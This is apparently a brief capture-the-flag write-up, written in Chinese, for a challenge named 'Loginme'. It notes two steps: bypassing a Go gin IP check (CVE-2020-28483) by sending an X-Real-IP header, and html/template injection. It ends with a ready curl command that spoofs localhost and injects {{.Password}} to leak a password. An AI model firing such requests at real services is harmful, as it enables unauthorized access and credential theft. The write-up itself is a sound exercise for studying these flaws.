# Loginme

考点
1. Golang gin CVE-2020-28483 绕过X-Forwarded-For头,使用X-Real-IP头(稍微看下源码)
2. 一个html/template的模板注入


```bash
curl -g "http://ip:port/admin/index?id=-11&age={{.Password}}" -H "X-Real-IP:127.0.0.1"
```

